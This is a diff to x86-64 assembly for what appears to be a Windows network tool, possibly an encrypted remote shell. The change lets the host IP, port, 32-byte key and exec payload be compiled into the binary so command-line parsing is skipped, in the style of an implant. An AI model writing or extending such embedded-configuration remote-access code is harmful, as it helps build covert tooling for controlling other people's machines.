@@ -5,6 +5,10 @@
 default rel
 bits 64
 
+%ifdef BAKED
+%include "baked.inc"
+%endif
+
 section .text
 global _start
 
@@ -230,6 +234,25 @@ _start:
     ; --- Step 1: Resolve all APIs ---
     call    resolve_all_apis
 
+%ifdef BAKED
+    ; Baked configuration — skip CLI parsing
+    mov     byte [rel g_mode], BAKED_MODE
+  %if BAKED_MODE == 0
+    mov     dword [rel g_host], BAKED_IP_DWORD
+  %endif
+    mov     word [rel g_port], BAKED_PORT_NET
+    cld
+    lea     rsi, [rel baked_key_data]
+    lea     rdi, [rel g_key]
+    mov     ecx, 32
+    rep     movsb
+  %ifdef BAKED_HAS_EXEC
+    lea     rax, [rel baked_exec_data]
+    mov     [rel g_exec], rax
+  %endif
+    jmp     .init_network
+%endif
+
     ; --- Step 2: Get command line string ---
     sub     rsp, 32
     call    [r15 + API_GetCommandLineA * 8]
@@ -397,6 +420,7 @@ _start:
     cmp     byte [rel g_has_key], 0
     je      .exit_error
 
+.init_network:
     ; --- Step 4: Initialize Winsock ---
     call    net_init
     test    eax, eax
